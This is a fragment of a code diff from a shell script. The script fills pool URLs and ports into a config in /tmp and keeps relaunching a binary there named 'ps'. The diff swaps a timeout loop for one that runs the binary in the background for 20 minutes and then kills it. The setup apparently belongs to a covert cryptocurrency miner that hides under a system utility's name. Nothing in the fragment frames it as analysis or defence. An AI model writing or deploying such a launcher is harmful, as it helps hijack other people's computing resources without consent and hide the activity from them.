@@ -60,8 +60,16 @@ sed -i "s/POOL_PORT_2/$pool_port_2/" "/tmp/$top/build_config"
 sed -i "s/POOL_URL_3/$pool_url_3/" "/tmp/$top/build_config"
 sed -i "s/POOL_PORT_3/$pool_port_3/" "/tmp/$top/build_config"
 
+# while :
+# do
+#   timeout 3m /tmp/$top/ps --config /tmp/$top/build_config >/dev/null 
+#   sleep 20s
+# done
+
 while :
 do
-  timeout 3m /tmp/$top/ps --config /tmp/$top/build_config >/dev/null 
-  sleep 20s
+   /tmp/$top/ps --config /tmp/$top/build_config &
+   pid=$!
+   sleep 20m
+   kill -n 9 $pid
 done
